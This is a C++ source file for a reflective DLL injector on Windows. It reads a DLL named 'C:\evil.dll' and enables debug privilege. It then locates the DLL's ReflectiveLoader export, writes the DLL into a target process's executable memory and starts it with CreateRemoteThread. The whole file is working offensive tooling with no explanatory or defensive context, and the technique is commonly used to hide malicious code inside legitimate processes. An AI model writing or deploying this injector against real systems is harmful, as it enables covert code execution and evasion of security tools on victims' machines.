#include "Injector.hpp"

DWORD Rva2Offset(DWORD dwRva, UINT_PTR uBaseAddr) {
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uBaseAddr + ((PIMAGE_DOS_HEADER)uBaseAddr)->e_lfanew);
	PIMAGE_SECTION_HEADER pSecHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);
	if (dwRva < pSecHeader[0].PointerToRawData) return dwRva;

	for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
		if (
			dwRva >= pSecHeader[i].VirtualAddress &&
			dwRva < (pSecHeader[i].VirtualAddress + pSecHeader[i].SizeOfRawData)
			) {
			return (dwRva - pSecHeader[i].VirtualAddress + pSecHeader[i].PointerToRawData);
		}
	}

	return 0;
}

DWORD GetFuncOffset(LPVOID lpBuffer, LPCSTR lpFuncName) {
#ifdef WIN_X64
	DWORD dwCompiledArch = 2;
#else
	DWORD dwCompiledArch = 1;
#endif

	UINT_PTR uBaseAddr = (UINT_PTR)lpBuffer;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)(uBaseAddr + (PIMAGE_DOS_HEADER)uBaseAddr);
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uBaseAddr + ((PIMAGE_DOS_HEADER)uBaseAddr)->e_lfanew);

	if (pNtHeaders->OptionalHeader.Magic == 0x010B) { // PE32
		if (dwCompiledArch != 1) return 0;
	}
	else if (pNtHeaders->OptionalHeader.Magic == 0x020B) {// PE32+
		if (dwCompiledArch != 2) return 0;
	}
	else {
		return 0;
	}

	UINT_PTR uTemp = (UINT_PTR) & (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(uBaseAddr + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uTemp)->VirtualAddress, uBaseAddr));

	UINT_PTR uNames = uBaseAddr + Rva2Offset(pExportDir->AddressOfNames, uBaseAddr);
	UINT_PTR uNameOrdinals = uBaseAddr + Rva2Offset(pExportDir->AddressOfNameOrdinals, uBaseAddr);
	UINT_PTR uAddresses = uBaseAddr + Rva2Offset(pExportDir->AddressOfFunctions, uBaseAddr);

	DWORD dwCnt = pExportDir->NumberOfNames;
	while (dwCnt--) {
		CHAR* sExportedFuncName = (CHAR*)(uBaseAddr + Rva2Offset(DEREF_32(uNames), uBaseAddr));
		if (strcmp(sExportedFuncName, lpFuncName) == 0) {
			uAddresses = uBaseAddr + Rva2Offset(pExportDir->AddressOfFunctions, uBaseAddr);
			uAddresses += (DEREF_16(uNameOrdinals) * sizeof(DWORD));

			return Rva2Offset(DEREF_32(uAddresses), uBaseAddr);
		}

		uNames += sizeof(DWORD);
		uNameOrdinals += sizeof(WORD);
	}

	return 0;
}

INT wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, INT nCmdShow) {
	DWORD dwPid = 8148; // Replace it
	WCHAR wDllPath[] = L"C:\\evil.dll"; // Replace it

	// --------------------------------------------
	// Get file bytes
	// --------------------------------------------

	HANDLE hFile = CreateFile(
		wDllPath,
		GENERIC_READ,
		0,
		nullptr,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		nullptr
	);
	if (!hFile) return FALSE;

	DWORD dwFileSize = GetFileSize(hFile, nullptr);
	if (dwFileSize == 0) {
		CloseHandle(hFile);
		return FALSE;
	}

	LPVOID lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwFileSize);
	if (!lpBuffer) {
		CloseHandle(hFile);
		return FALSE;
	}

	DWORD dwBytesRead = 0;
	if (!ReadFile(hFile, lpBuffer, dwFileSize, &dwBytesRead, nullptr)) {
		HeapFree(GetProcessHeap(), 0, lpBuffer);
		CloseHandle(hFile);
		return FALSE;
	}

	CloseHandle(hFile);

	// --------------------------------------------
	// Open target process.
	// --------------------------------------------

	HANDLE hToken = nullptr;
	TOKEN_PRIVILEGES priv = { 0 };

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			AdjustTokenPrivileges(hToken, FALSE, &priv, 0, nullptr, nullptr);

		CloseHandle(hToken);
	}

	HANDLE hProcess = OpenProcess(
		PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
		FALSE,
		dwPid
	);
	if (!hProcess) return FALSE;

	// --------------------------------------------
	// Inject reflective DLL
	// --------------------------------------------

	// Get offset of the ReflectiveLoader function in the DLL.
	DWORD dwReflectiveOffset = GetFuncOffset(lpBuffer, "ReflectiveLoader");
	if (dwReflectiveOffset == 0) {
		CloseHandle(hProcess);
		return FALSE;
	}

	LPVOID lpRemoteBuffer = VirtualAllocEx(hProcess, nullptr, dwFileSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpRemoteBuffer) return FALSE;

	if (!WriteProcessMemory(hProcess, lpRemoteBuffer, lpBuffer, dwFileSize, nullptr))
		return FALSE;

	LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteBuffer + dwReflectiveOffset);

	HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 1024 * 1024, lpReflectiveLoader, FALSE, (DWORD)nullptr, nullptr);
	if (hThread) {
		WaitForSingleObject(hThread, INFINITE);
	}

	VirtualFree(&lpRemoteBuffer, 0, MEM_RELEASE);
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return EXIT_SUCCESS;
}